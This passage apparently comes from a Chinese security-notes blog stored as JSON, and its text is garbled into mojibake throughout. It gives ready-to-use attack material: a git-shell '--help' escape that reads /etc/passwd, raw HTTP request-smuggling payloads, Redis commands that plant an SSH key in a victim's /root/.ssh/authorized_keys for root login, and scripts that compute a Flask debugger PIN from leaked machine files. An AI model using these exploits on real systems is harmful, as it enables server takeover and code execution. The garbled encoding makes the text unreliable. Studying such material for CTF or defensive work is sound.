ç¬¬ä¸€ç§æ–¹æ³•æ¯”è¾ƒç›´è§‚ï¼Œå°±æ˜¯åˆ›å»ºç”¨æˆ·çš„æ—¶å€™ä¸ç»™å…¶æ­£å¸¸çš„bashæˆ–shçš„shellï¼Œè€Œæ˜¯ç»™å®ƒä¸€ä¸ªgit-shellã€‚git-shellæ˜¯ä¸€ä¸ªæ²™ç›’ç¯å¢ƒï¼Œåœ¨git-shellä¸‹ï¼Œåªå…è®¸æ‰§è¡Œæ²™ç›’å†…åŒ…å«çš„å‘½ä»¤ã€‚\n  > â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\n  > ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡ä¸ºCSDNåšä¸»ã€Œå»ºç“¯æœ€åã€çš„åŸåˆ›æ–‡ç« ï¼Œéµå¾ªCC 4.0 BY-SAç‰ˆæƒåè®®ï¼Œè½¬è½½è¯·é™„ä¸ŠåŸæ–‡å‡ºå¤„é“¾æ¥åŠæœ¬å£°æ˜ã€‚\n  > åŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/JiangBuLiu/article/details/95065034\n\n- åœ¨githubä¸­ç¡®å®æ˜¯åªæœ‰è¿™ä¸‰æ¡å‘½ä»¤å¯ç”¨\n\n  - `git-receive-pack <argument>`\n  - `git-upload-pack <argument>`\n  - `git-upload-archive <argument>`\n\n- ä½†æ˜¯åé¢æœ‰äº†å‚æ•°ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡--helpæ¥æ‰“å¼€ä¸€ä¸ªmané¡µé¢ï¼Œå¹¶ä¸”å…¶ä¼šè‡ªåŠ¨è°ƒç”¨lesså‘½ä»¤ï¼Œè€Œé€šè¿‡lesså‘½ä»¤æˆ‘ä»¬å°±èƒ½ç›´æ¥é€šè¿‡`shift+e`é”®æ¥å®ç°ä»»æ„æ–‡ä»¶è¯»å–ï¼Œç”šè‡³å¯ä»¥é€šè¿‡`!å‘½ä»¤`æ¥å®ç°ä»»æ„å‘½ä»¤æ‰§è¡Œ\n\næ¼æ´å†…å®¹ï¼šé€šè¿‡githubçš„SSHå®ç°ä»»æ„æ–‡ä»¶è¯»å–\n\næ¼æ´å¤ç°ï¼š\n\n1. é¦–å…ˆè¿˜æ˜¯vulhubå¯ä¸€ä¸ªæœåŠ¡å™¨ï¼Œå¯ä»¥çœ‹åˆ°ç›®å½•ä¸‹æœ‰id_rsaç§é’¥æ–‡ä»¶ï¼Œæˆ‘ä»¬ç›´æ¥é€šè¿‡è¿™ä¸ªç§é’¥æ¥è¿æ¥dockerï¼Œå¹¶ä¸”æ‰§è¡Œ`git-upload-archive '--help'`å‘½ä»¤\n\n   ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209010033494.png)\n\n   å¯ä»¥çœ‹åˆ°å‘½ä»¤æ‰§è¡ŒæˆåŠŸè¿›å…¥äº†mané¡µé¢\n\n2. å°è¯•è¯»å–/etc/passwd![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209010034597.png)\n\n   è¯»å–æˆåŠŸ\n\n   \n\n\n\n"},{"title":"ç ´ç ´çƒ‚çƒ‚ç¢ç¢çŸ¥è¯†æ±‡æ€»","url":"/posts/ad1540aa.html","content":"\n## HTTPéƒ¨åˆ†è¯·æ±‚å¤´\n\n### Transfer-Encoding\n\nå…¶ä¸­ä¸­æœ‰ä¸€ç±»ç‰¹å®šç¼–ç :chunkedç¼–ç .è¯¥ç¼–ç å°†å®ä½“åˆ†å—ä¼ é€å¹¶é€å—æ ‡æ˜é•¿åº¦,ç›´åˆ°é•¿åº¦ä¸º0å—è¡¨ç¤ºä¼ è¾“ç»“æŸ, è¿™åœ¨å®ä½“é•¿åº¦æœªçŸ¥æ—¶ç‰¹åˆ«æœ‰ç”¨(æ¯”å¦‚ç”±æ•°æ®åº“åŠ¨æ€äº§ç”Ÿçš„æ•°æ®)ï¼Œè¯¥ç¼–ç æ ¼å¼ä¸º\n\n```\nTransfer-Encoding: chunked\\r\\n\n\\r\\n\n16è¿›åˆ¶è¡¨ç¤ºä¸‹ä¸€ä¸ªåˆ†å—çš„é•¿åº¦\\r\\n\nè¦å‘é€çš„æ•°æ®\\r\\n\né‡å¤ä¸Šåˆ—æ•°æ®ç›´åˆ°æœ€ç»ˆç»“å°¾ä½¿ç”¨ä¸€ä¸ªç©ºçš„æ•°æ®å—æ¥è¡¨ç¤ºå†…å®¹ç»“æŸ\n0\\r\\n\n\\r\\n\n```\n\n<!--more -->\n\n## å†…å­˜é©¬\n\næ¡ä»¶ï¼š/proc/æŸè¿›ç¨‹pid/memå¯è¯»\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## HTTPè¯·æ±‚èµ°ç§\n\n### æˆå› \n\nè¯·æ±‚èµ°ç§å¤§å¤šå‘ç”Ÿäºå‰ç«¯æœåŠ¡å™¨å’Œåç«¯æœåŠ¡å™¨å¯¹å®¢æˆ·ç«¯ä¼ å…¥çš„æ•°æ®ç†è§£ä¸ä¸€è‡´çš„æƒ…å†µã€‚è¿™æ˜¯å› ä¸ºHTTPè§„èŒƒæä¾›äº†ä¸¤ç§ä¸åŒçš„æ–¹æ³•æ¥æŒ‡å®šè¯·æ±‚çš„ç»“æŸä½ç½®ï¼Œå³ `Content-Length` å’Œ `Transfer-Encoding` æ ‡å¤´ã€‚\n\n### åˆ†ç±»\n\n- CLTEï¼šå‰ç«¯æœåŠ¡å™¨ä½¿ç”¨ `Content-Length` å¤´ï¼Œåç«¯æœåŠ¡å™¨ä½¿ç”¨ `Transfer-Encoding` å¤´\n- TECLï¼šå‰ç«¯æœåŠ¡å™¨ä½¿ç”¨ `Transfer-Encoding` æ ‡å¤´ï¼Œåç«¯æœåŠ¡å™¨ä½¿ç”¨ `Content-Length` æ ‡å¤´ã€‚\n- TETEï¼šå‰ç«¯å’Œåç«¯æœåŠ¡å™¨éƒ½æ”¯æŒ `Transfer-Encoding` æ ‡å¤´ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡ä»¥æŸç§æ–¹å¼æ¥è¯±å¯¼å…¶ä¸­ä¸€ä¸ªæœåŠ¡å™¨ä¸å¤„ç†å®ƒã€‚\n\n### æ”»å‡»æ–¹å¼\n\n1. CLä¸ä¸º0çš„GETè¯·æ±‚\n\n   å½“å‰ç«¯æœåŠ¡å™¨å…è®¸GETè¯·æ±‚æºå¸¦è¯·æ±‚ä½“ï¼Œè€Œåç«¯æœåŠ¡å™¨ä¸å…è®¸GETè¯·æ±‚æºå¸¦è¯·æ±‚ä½“ï¼Œå®ƒä¼šç›´æ¥å¿½ç•¥æ‰GETè¯·æ±‚ä¸­çš„ `Content-Length` å¤´ï¼Œä¸è¿›è¡Œå¤„ç†ã€‚ä¾‹å¦‚ä¸‹é¢è¿™ä¸ªä¾‹å­ï¼š\n\n   ```http\n   GET / HTTP/1.1\\r\\n\n   Host: example.com\\r\\n\n   Content-Length: 44\\r\\n\n   \n   GET /secret HTTP/1.1\\r\\n\n   Host: example.com\\r\\n\n   \\r\\n\n   ```\n\n   è¿™æ—¶å‰ç«¯å¯¹ `Content-Length` å¤´è¿›è¡Œäº†å¤„ç†ï¼Œå°†åç»­ä¼ªé€ çš„GETè¯·æ±‚ä¼ å…¥äº†åç«¯ï¼Œè€Œåç«¯åˆ™æ²¡æœ‰å¤„ç†ï¼Œç›´æ¥å°†ä¸‹é¢çš„å†…å®¹å½“åšäº†åˆä¸€ä¸ªç‹¬ç«‹è¯·æ±‚è¿›è¡Œå¤„ç†\n\n2. åŒCLå€¼ä¸åŒçš„è¯·æ±‚\n\n   æ ¹æ®RFC 7230ï¼Œå½“æœåŠ¡å™¨æ”¶åˆ°çš„è¯·æ±‚ä¸­åŒ…å«ä¸¤ä¸ª `Content-Length` ï¼Œè€Œä¸”ä¸¤è€…çš„å€¼ä¸åŒæ—¶ï¼Œéœ€è¦è¿”å›400é”™è¯¯ï¼Œä½†æ˜¯æœ‰çš„æœåŠ¡å™¨å¹¶æ²¡æœ‰ä¸¥æ ¼å®ç°è¿™ä¸ªè§„èŒƒã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œå½“å‰åç«¯å„å–ä¸åŒçš„ `Content-Length` å€¼æ—¶ï¼Œå°±ä¼šå‡ºç°æ¼æ´ã€‚ä¾‹å¦‚ï¼š\n\n   ```http\n   POST / HTTP/1.1\\r\\n\n   Host: example.com\\r\\n\n   Content-Length: 8\\r\\n\n   Content-Length: 7\\r\\n\n   \n   12345\\r\\n\n   a\n   ```\n\n   è¿™ä¸ªä¾‹å­ä¸­çš„aå°±ä¼šè¢«å¸¦å…¥åˆ°ä¸‹ä¸€ä¸ªè¯·æ±‚ä¸­ï¼Œä½¿å¾—ä¸‹ä¸€ä¸ªè¯·æ±‚å˜æˆäº†\n\n   ```http\n   aGET / HTTP/1.1\\r\\n\n   ```\n\n3. CL-TE\n\n   æŒ‡å‰ç«¯æœåŠ¡å™¨å¤„ç† `Content-Length` è¿™ä¸€è¯·æ±‚å¤´ï¼Œè€Œåç«¯æœåŠ¡å™¨éµå®ˆRFC2616çš„è§„å®šï¼Œå¿½ç•¥æ‰ `Content-Length` ï¼Œå¤„ç† `Transfer-Encoding` ã€‚ä¾‹å¦‚ï¼š\n\n   ```http\n   POST / HTTP/1.1\\r\\n\n   Host: example.com\\r\\n\n   Content-Length: 4\\r\\n\n   Transfer-Encoding: chunked\\r\\n\n   \\r\\n\n   12\\r\\n\n   aPOST / HTTP/1.1\\r\\n\n   \\r\\n\n   0\\r\\n\n   \\r\\n\n   ```\n\n   æ­¤å¤„å‰ç«¯åªå¤„ç†äº† `Content-Length` è¿™ä¸€è¯·æ±‚å¤´è€Œå¿½ç•¥äº† `Transfer-Encoding` è¯·æ±‚å¤´\n\n4. TE-TE\n\n   æŒ‡å‰åç«¯æœåŠ¡å™¨éƒ½å¤„ç† `Transfer-Encoding` è¯·æ±‚å¤´ï¼Œä½†æ˜¯åœ¨å®¹é”™æ€§ä¸Šè¡¨ç°ä¸åŒï¼Œä¾‹å¦‚æœ‰çš„æœåŠ¡å™¨å¯èƒ½ä¼šå¤„ç† `Transfer-encoding` ï¼Œæµ‹è¯•ä¾‹å¦‚ï¼š\n\n   ```http\n   POST / HTTP/1.1\\r\\n\n   Host: example.com\\r\\n\n   Content-length: 4\\r\\n\n   Transfer-Encoding: chunked\\r\\n\n   Transfer-encoding: cow\\r\\n\n   \\r\\n\n   5c\\r\\n\n   aPOST / HTTP/1.1\\r\\n\n   Content-Type: application/x-www-form-urlencoded\\r\\n\n   Content-Length: 15\\r\\n\n   \\r\\n\n   x=1\\r\\n\n   0\\r\\n\n   \\r\\n\n   ```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## PHP sessionååºåˆ—åŒ–\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## Redisæœªæˆæƒè®¿é—®\n\nå…¶å®å¹¶ä¸æ˜¯CVEï¼Œä½†ä¹Ÿæ˜¯ä¸ªè›®æœ‰è¶£çš„æ¼æ´ï¼Œä¼—æ‰€å‘¨çŸ¥rediså’Œmemcachedè¿™ä¿©éš¾å…„éš¾å¼Ÿæ˜¯ä¸éœ€è¦å¯†ç çš„ï¼Œä½†æ˜¯ä»–ä»¬åŒæ—¶åˆæœ‰å¾ˆé«˜çš„æƒé™ï¼Œæ‰€ä»¥å½“è¿™ä¿©è´§å¯¹å¤–ç½‘å¼€å¯è®¿é—®æƒé™çš„æ—¶å€™å°±å¾ˆå®¹æ˜“è¢«æ‰«æåˆ°å¹¶ä¸”è¢«æï¼Œé‚£ä¹ˆè¯ä¸å¤šè¯´ï¼Œå¼€å¹²ï¼\n\nåˆ©ç”¨æ¡ä»¶ï¼šRediså¼€æ”¾ç»™å¤–éƒ¨è®¿é—®å¹¶ä¸”çŸ¥é“sshé“¾æ¥ç«¯å£\n\næ¼æ´åˆ©ç”¨ï¼š\n\n1. é¦–å…ˆæ­å»ºå¥½redisæœåŠ¡å¹¶æ›´æ”¹é…ç½®æ–‡ä»¶æ‰“å¼€å¤–éƒ¨è®¿é—®\n2. åœ¨æœ¬æœºä¸­ä½¿ç”¨`ssh-keygen -t rsa`å‘½ä»¤æ¥è‡ªåŠ¨ç”Ÿæˆå…¬ç§é’¥\n3. ä¸‹é¢å°±æ˜¯å°†å…¬é’¥å†™å…¥å—å®³æœºå™¨çš„`.ssh`ç›®å½•ä¸‹ï¼Œæ­¤å¤„æˆ‘ä»¬åˆ©ç”¨rediså¤‡ä»½æ•°æ®åº“æ–‡ä»¶çš„æ–¹å¼è¿›è¡Œï¼Œé¦–å…ˆä½¿ç”¨rediså‘½ä»¤å°†å†…å®¹å†™å…¥åˆ°ä¸€ä¸ªæ•°æ®ä¸­`(echo -e \"\\n\\n\"; cat ~/.ssh/id_rsa.pub; echo -e \"\\n\\n\") | redis-cli -h å—å®³è€…IP -p redisç«¯å£ -x set crackit`ï¼Œè¿™æ ·æˆ‘ä»¬å°±å°†å…¬é’¥å†™å…¥åˆ°äº†æ•°æ®åº“ä¸­\n4. å†™å…¥åˆ°æ•°æ®åº“ä¸­è¿˜éœ€è¦å°†å…¬é’¥ä¿å­˜ä¸ºæ–‡ä»¶æ‰èƒ½ç”Ÿæ•ˆï¼Œæˆ‘ä»¬åˆ©ç”¨rediså‘½ä»¤æ¥å°†å…¬é’¥æ–‡ä»¶ä»¥æ•°æ®åº“å¤‡ä»½çš„å½¢å¼æ”¾å…¥`/root/.ssh/authorized_keys`ï¼Œä½¿ç”¨`config set dir /root/.ssh;config set dbfilename authorized_keys;save;`æ¥å°†æ•°æ®åº“æ–‡ä»¶ä¿å­˜\n5. ä½¿ç”¨ç§é’¥ç›´æ¥è¿æ¥å—å®³è€…æœåŠ¡å™¨`ssh -i ~/.ssh/id_rsa root@å—å®³è€…IP -p SSHæœåŠ¡ç«¯å£`\n\n\n\n## Flask PINå€¼è®¡ç®—\n\nç›´æ¥æ”¾è„šæœ¬ç®—äº†\n\n```python\n#MD5 python3.6\nimport hashlib\nfrom itertools import chain\nprobably_public_bits = [\n     'flaskweb'# flaskæ‰§è¡Œç”¨æˆ·\n     'flask.app',# é»˜è®¤\n     'Flask',# é»˜è®¤\n     '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),æŠ¥é”™ä¹Ÿå¯\n]\n\nprivate_bits = [\n     '25214234362297',# str(uuid.getnode()),  /sys/class/net/ens33/address\n     '0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa'# get_machine_id(), /etc/machine-id\n]\n\nh = hashlib.md5()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n        continue\n    if isinstance(bit, str):\n        bit = bit.encode('utf-8')\n    h.update(bit)\nh.update(b'cookiesalt')\n\ncookie_name = '__wzd' + h.hexdigest()[:20]\n\nnum = None\nif num is None:\n   h.update(b'pinsalt')\n   num = ('%09d' % int(h.hexdigest(), 16))[:9]\n\nrv =None\nif rv is None:\n   for group_size in 5, 4, 3:\n       if len(num) % group_size == 0:\n          rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')\n                      for x in range(0, len(num), group_size))\n          break\n       else:\n          rv = num\n\nprint(rv)\n```\n\n```python\n#sha1 python3.8\nimport hashlib\nfrom itertools import chain\nprobably_public_bits = [\n    'root'# /etc/passwd\n    'flask.app',# é»˜è®¤å€¼\n    'Flask',# é»˜è®¤å€¼\n    '/usr/local/lib/python3.8/site-packages/flask/app.py' # æŠ¥é”™å¾—åˆ°\n]\n\nprivate_bits = [\n    '2485377581187',#  /sys/class/net/eth0/address 16è¿›åˆ¶è½¬10è¿›åˆ¶\n    #machine_idç”±ä¸‰ä¸ªåˆå¹¶(dockerå°±åä¸¤ä¸ª)ï¼š1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup\n    '653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd'#  /proc/self/cgroup\n]\n\nh = hashlib.sha1()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n        continue\n    if isinstance(bit, str):\n        bit = bit.encode('utf-8')\n    h.update(bit)\nh.update(b'cookiesalt')\n\ncookie_name = '__wzd' + h.hexdigest()[:20]\n\nnum = None\nif num is None:\n    h.update(b'pinsalt')\n    num = ('%09d' % int(h.hexdigest(), 16))[:9]\n\nrv =None\nif rv is None:\n    for group_size in 5, 4, 3:\n        if len(num) % group_size == 0:\n            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')\n                          for x in range(0, len(num), group_size))\n            break\n    else:\n        rv = num\n\nprint(rv)\n```\n\næ€»ä¹‹éœ€è¦çš„æ–‡ä»¶å°±æ˜¯\n\n> /sys/class/net/eth0/address\n>\n> /etc/machine-id\n>\n> /proc/sys/kernel/random/boot_id\n>\n> /proc/self/cgroup\n>\n> å¿…è¦çš„å°±æ˜¯machine-idï¼Œæ²¡æœ‰çš„è¯å°±ç”¨boot_idä»£æ›¿\n\n## å¥‡æ€ªçš„åè®®\n\nä¼—æ‰€å‘¨çŸ¥å•Šï¼Œç°åœ¨ç½‘ç»œä¼ è¾“æœ‰éå¸¸å¤šçš„åè®®ï¼Œæ‰“CTFå‘¢æœ€è¿‘è¶Šæ¥è¶Šæ²¡æœ‰ä»€ä¹ˆæ­£å¸¸çš„httpåè®®äº†ï¼Œæ‰€ä»¥å‡†å¤‡å†™ä¸€ä¸ªå°å°çš„æ–‡ç« ç¨å¾®æ€»ç»“ä¸€ä¸‹å„ç§å¥‡æ€ªåè®®ï¼Œä¸‡ä¸€ä»¥åç”¨çš„åˆ°å‘¢ï½ï½ï½\n\n\n\n### FTP\n\nFTPåè®®æ˜¯äº’è”ç½‘ä¸Šå¹¿æ³›ä½¿ç”¨çš„æ–‡ä»¶ä¼ è¾“åè®®\n\nå®¢æˆ·ç«¯/æœåŠ¡å™¨æ¨¡å¼ï¼ŒåŸºäºTCPåè®®\n\né‡‡ç”¨åŒTCPè¿æ¥æ–¹å¼\n\n- æ§åˆ¶è¿æ¥é»˜è®¤ä½¿ç”¨TCPç«¯å£å·21ï¼Œæ§åˆ¶è¿æ¥åœ¨æ•´ä¸ªä¼šè¯æœŸé—´éƒ½ä¼šä¿æŒæ‰“å¼€\n- æ•°æ®è¿æ¥é»˜è®¤ä½¿ç”¨TCPç«¯å£å·20ï¼Œæ•°æ®è¿æ¥åœ¨ä¼ è¾“æ–‡ä»¶æ—¶æ‰“å¼€ï¼Œæ–‡ä»¶ä¼ è¾“ç»“æŸï¼Œè¿æ¥ç»ˆæ­¢\n\nFTPæœ‰ä¸¤ç§æ–‡ä»¶ä¼ è¾“æ¨¡å¼\n\n- ASCIIæ¨¡å¼æ˜¯é»˜è®¤çš„æ–‡ä»¶ä¼ è¾“æ¨¡å¼ï¼Œä¼šå°†æ–‡ä»¶è½¬ä¸ºæ ‡å‡†ASCIIç å†è¿›è¡Œä¼ è¾“\n- äºŒè¿›åˆ¶æ¨¡å¼åˆç§°å›¾åƒæ–‡ä»¶ä¼ è¾“æ¨¡å¼ï¼Œæ–‡ä»¶ä¼šæŒ‰ç…§æ¯”ç‰¹æµçš„æ–¹å¼è¿›è¡Œä¼ è¾“\n\nFTPé‡‡ç”¨ä¸¤ç§æ•°æ®ä¼ è¾“æ–¹å¼\n\n- ä¸»åŠ¨ï¼ˆStandardï¼‰æ–¹å¼ï¼Œåˆç§°ä¸ºPORTæ–¹å¼ï¼Œå®¢æˆ·ç«¯é¦–å…ˆå‘æœåŠ¡ç«¯å‘é€PORTå‘½ä»¤ï¼Œå‘Šè¯‰æœåŠ¡å™¨ç”¨äºæ•°æ®ä¼ è¾“çš„ä¸´æ—¶ç«¯å£å·ï¼Œå½“è¿›è¡Œæ•°æ®ä¼ è¾“æ—¶ï¼Œç”±æœåŠ¡å™¨å‘å®¢æˆ·ç«¯æŒ‡å®šç«¯å£å‘èµ·è¿æ¥ï¼Œç”±äºæ˜¯æœåŠ¡å™¨å‘èµ·è¿æ¥ï¼Œæ‰€ä»¥å«ä¸»åŠ¨æ–¹å¼ï¼Œ\n\n  FTPæœåŠ¡å™¨å¿…é¡»å’Œå®¢æˆ·ç«¯å»ºç«‹ä¸€ä¸ªæ–°çš„è¿æ¥ç”¨æ¥ä¼ é€æ•°æ®ã€‚\n\n- è¢«åŠ¨ï¼ˆPassiveï¼‰æ–¹å¼ï¼Œåˆç§°ä¸ºPASVæ–¹å¼ï¼ŒæœåŠ¡å™¨æ”¶åˆ°PASVå‘½ä»¤åéšå³æ‰“å¼€ä¸€ä¸ªé«˜ç«¯ï¼ˆå¤§äº1024ï¼‰ç«¯å£ï¼Œå¹¶é€šçŸ¥å®¢æˆ·ç«¯åœ¨è¿™ä¸ªç«¯å£ä¸Šä¼ é€æ•°æ®ï¼Œç”±å®¢æˆ·ç«¯å‘æœåŠ¡ç«¯çš„æŒ‡å®šç«¯å£å‘èµ·è¿æ¥ï¼Œæ‰€ä»¥å«è¢«åŠ¨æ–¹å¼\n\n  FTPæœåŠ¡å™¨ä¸å†éœ€è¦å»ºç«‹ä¸€ä¸ªæ–°çš„å’Œå®¢æˆ·ç«¯ä¹‹é—´çš„è¿æ¥ã€‚\n\nFTPä¸­çš„å‘½ä»¤å’Œåº”ç­”ï¼šå‘½ä»¤å’Œåº”ç­”åœ¨å®¢æˆ·å’ŒæœåŠ¡å™¨çš„æ§åˆ¶è¿æ¥ä¸Šä»¥ NVT ASCIIç å½¢å¼ä¼ é€ã€‚è¿™å°±è¦æ±‚åœ¨æ¯è¡Œç»“å°¾éƒ½è¦è¿”å›C Rã€ L Få¯¹ï¼ˆä¹Ÿå°±æ˜¯æ¯ä¸ªå‘½ä»¤æˆ–æ¯ä¸ªåº”ç­”ï¼‰ã€‚è¿™äº›å‘½ä»¤éƒ½æ˜¯3æˆ–4ä¸ªå­—èŠ‚çš„å¤§å†™ASCIIå­—ç¬¦ï¼Œå…¶ä¸­ä¸€äº›å¸¦é€‰é¡¹å‚æ•°ã€‚ä¸‹é¢æ˜¯ä¸€äº›å‘½ä»¤ï¼ˆæ¥è‡ªå®¢æˆ·ç«¯ï¼‰\n\n| å‘½ä»¤                     | è¯´æ˜                                          |\n| ------------------------ | --------------------------------------------- |\n| `ABOR`                   | æ”¾å¼ƒå…ˆå‰çš„FTPå‘½ä»¤ä¸æ•°æ®ä¼ è¾“                   |\n| `LIST filename`          | åˆ—è¡¨æ˜¾ç¤ºæ–‡ä»¶æˆ–ç›®å½•                            |\n| `USER username`          | æœåŠ¡å™¨ä¸Šçš„ç”¨æˆ·å                              |\n| `PASS password`          | æœåŠ¡å™¨ä¸Šçš„å£ä»¤                                |\n| `PORT n1,n2,n3,n4,n5,n6` | å®¢æˆ·ç«¯çš„IPåœ°å€ä¸ç«¯å£ï¼ˆn1.n2.n3.n4:n5*256+n6ï¼‰ |\n| `QUIT`                   | æ³¨é”€                                          |\n| `RETR filename`          | æ£€ç´¢ä¸€ä¸ªæ–‡ä»¶                                  |\n| `STOR filename`          | å­˜å‚¨ä¸€ä¸ªæ–‡ä»¶                                  |\n| `SYST`                   | ä»æœåŠ¡å™¨è¿”å›ç³»ç»Ÿç¼–ç ç±»å‹                      |\n| `TYPE typeUSER`          | è¯´æ˜æ–‡ä»¶ä¼ è¾“æ¨¡å¼ï¼šAè¡¨ç¤ºASCIIç ï¼ŒIè¡¨ç¤ºæ¯”ç‰¹æµ   |\n\nè€ŒFTPçš„åº”ç­”éƒ½æ˜¯ASCIIç å½¢å¼çš„ä¸‰ä½æ•°å­—ï¼Œå¹¶ä¸”è·Ÿæœ‰æŠ¥æ–‡æ¥å¸®åŠ©äººå·¥å¤„ç†ï¼Œè¿™é‡Œæ˜¯ä¸€äº›æœ‰ç”¨çš„[å“åº”æ•°æ®](https://blog.csdn.net/cbffyx/article/details/78891603)\n\n| åº”ç­” | è¯´æ˜                                                         |\n| ---- | ------------------------------------------------------------ |\n| 1yz  | è‚¯å®šé¢„å¤‡åº”ç­”ï¼Œåœ¨å‘é€å¦ä¸€ä¸ªå‘½ä»¤å‰æœŸå¾…å¦ä¸€ä¸ªåº”ç­”æ—¶å¯åŠ¨         |\n| 2yz  | è‚¯å®šå®Œæˆåº”ç­”ï¼Œä¸€ä¸ªæ–°å‘½ä»¤å¯ä»¥å‘é€                             |\n| 3yz  | è‚¯å®šä¸­ä»‹åº”ç­”ï¼Œè¯¥å‘½ä»¤å·²è¢«åº”ç­”ï¼Œä½†å¦ä¸€ä¸ªå‘½ä»¤å¿…é¡»è¢«å‘é€         |\n| 4yz  | æš‚æ€å¦å®šå®Œæˆåº”ç­”ï¼Œè¯·æ±‚åŠ¨ä½œæœªå‘ç”Ÿï¼Œä½†å·®é”™æ˜¯æš‚æ—¶çš„ï¼Œå‘½ä»¤å¯ä»¥è¿‡åå†å‘ |\n| 5yz  | æ°¸ä¹…æ€§å¦å®šå®Œæˆåº”ç­”ï¼Œå‘½ä»¤ä¸è¢«æ¥å—å¹¶ä¸”ä¸å†è¿›è¡Œé‡è¯•             |\n| x0z  | è¯­æ³•é”™è¯¯                                                     |\n| x1z  | ä¿¡æ¯                                                         |\n| x2z  | è¿æ¥ï¼Œåº”ç­”æŒ‡æ§åˆ¶æˆ–æ•°æ®è¿æ¥                                   |\n| x3z  | é‰´åˆ«å’Œè®°è´¦ï¼Œåº”ç­”ç”¨äºæ³¨å†Œæˆ–è®°è´¦å‘½ä»¤                           |\n| x4z  | æœªæŒ‡æ˜                                                       |\n| x5z  | æ–‡ä»¶ç³»ç»ŸçŠ¶æ€                                                 |\n\nä¸‹é¢æ˜¯ä¸€æ¬¡æ­£å¸¸çš„FTPè¿æ¥çš„åŒæ–¹æ•°æ®äº¤äº’çš„è¿‡ç¨‹\n\n```\nå“åº”: \t220 (vsFTPd 3.0.2)\nå‘½ä»¤: \tAUTH TLS\nå“åº”: \t530 Please login with USER and PASS.\nå‘½ä»¤: \tAUTH SSL\nå“åº”: \t530 Please login with USER and PASS.\nçŠ¶æ€: \tä¸å®‰å…¨çš„æœåŠ¡å™¨ï¼Œä¸æ”¯æŒ FTP over TLSã€‚\nå‘½ä»¤: \tUSER test\nå“åº”: \t331 Please specify the password.\nå‘½ä»¤: \tPASS ****\nå“åº”: \t230 Login successful.\nå‘½ä»¤: \tOPTS UTF8 ON\nå“åº”: \t200 Always in UTF8 mode.\nå‘½ä»¤: \tCWD /\nå“åº”: \t250 Directory successfully changed.\nå‘½ä»¤: \tPWD\nå“åº”: \t257 \"/\"\nå‘½ä»¤: \tTYPE A\nå“åº”: \t200 Switching to ASCII mode.\nå‘½ä»¤: \tPASV\nå“åº”: \t227 Entering Passive Mode (172,17,0,6,82,117).\nå‘½ä»¤: \tSTOR main.py\nå“åº”: \t150 Ok to send data.\nå“åº”: \t226 Transfer complete.\nå‘½ä»¤: \tTYPE I\nå“åº”: \t200 Switching to Binary mode.\nå‘½ä»¤: \tPASV\nå“åº”: \t227 Entering Passive Mode (172,17,0,6,82,111).\nå‘½ä»¤: \tLIST\nå“åº”: \t150 Here comes the directory listing.\nå“åº”: \t226 Directory send OK.\n```\n\n### WEBSOCKET\n\nHTTPåè®®æœ‰ä¸€ä¸ªçš„ç¼ºé™·ä¸ºï¼šé€šä¿¡åªèƒ½ç”±å®¢æˆ·ç«¯å‘èµ·ã€‚åœ¨ä¸€äº›åœºæ™¯ä¸‹ï¼Œè¿™ç§å•å‘è¯·æ±‚çš„ç‰¹ç‚¹ï¼Œæ³¨å®šäº†å¦‚æœæœåŠ¡å™¨æœ‰è¿ç»­çš„çŠ¶æ€å˜åŒ–ï¼Œå®¢æˆ·ç«¯è¦è·çŸ¥å°±éå¸¸éº»çƒ¦ã€‚æˆ‘ä»¬åªèƒ½ä½¿ç”¨[è½®è¯¢](https://so.csdn.net/so/search?q=è½®è¯¢&spm=1001.2101.3001.7020)ï¼šæ¯éš”ä¸€æ®µæ—¶å€™ï¼Œå°±å‘å‡ºä¸€ä¸ªè¯¢é—®ï¼Œäº†è§£æœåŠ¡å™¨æœ‰æ²¡æœ‰æ–°çš„ä¿¡æ¯ã€‚è½®è¯¢æ•ˆç‡ä½åˆ‡æµªè´¹èµ„æºï¼Œæ­¤æ—¶ï¼Œwebsocketå°±è¢«å‘æ˜äº†\n\nWebscoketæ˜¯Webæµè§ˆå™¨å’ŒæœåŠ¡å™¨ä¹‹é—´çš„ä¸€ç§å…¨åŒå·¥é€šä¿¡åè®®ï¼Œå…¶ä¸­WebSocketåè®®ç”±IETFå®šä¸ºæ ‡å‡†ï¼ŒWebSocket APIç”±W3Cå®šä¸ºæ ‡å‡†ã€‚ä¸€æ—¦Webå®¢æˆ·ç«¯ä¸æœåŠ¡å™¨å»ºç«‹èµ·è¿æ¥ï¼Œä¹‹åçš„å…¨éƒ¨æ•°æ®é€šä¿¡éƒ½é€šè¿‡è¿™ä¸ªè¿æ¥è¿›è¡Œã€‚é€šä¿¡è¿‡ç¨‹ä¸­ï¼Œå¯äº’ç›¸å‘é€JSONã€XMLã€HTMLæˆ–å›¾ç‰‡ç­‰ä»»æ„æ ¼å¼çš„æ•°æ®ã€‚\n\nä¸HTTPçš„ç›¸åŒç‚¹ï¼š\n\n- éƒ½æ˜¯åŸºäºTCPçš„åº”ç”¨å±‚åè®®\n- éƒ½ä½¿ç”¨Request/Responseæ¨¡å‹è¿›è¡Œè¿æ¥çš„å»ºç«‹\n- 